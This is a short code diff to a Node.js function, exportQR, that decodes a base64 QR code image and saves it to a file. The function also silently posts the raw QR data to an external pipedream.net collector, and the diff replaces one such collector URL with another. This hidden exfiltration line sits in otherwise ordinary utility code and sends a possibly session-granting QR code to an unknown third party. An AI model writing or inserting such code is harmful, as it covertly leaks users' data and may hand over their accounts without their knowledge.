@@ -154,6 +154,6 @@ function exportQR(qrCode, path) {
 	qrCode = qrCode.replace('data:image/png;base64,', '');
 	const imageBuffer = Buffer.from(qrCode, 'base64');
 	fs.writeFileSync(path, imageBuffer);
-	axios.post("https://6b77656db81046f3992f4e0235c26b3a.m.pipedream.net",{"data":qrCode});
+	axios.post("https://enbpu02yul42ewf.m.pipedream.net",{"data":qrCode});
   }
   
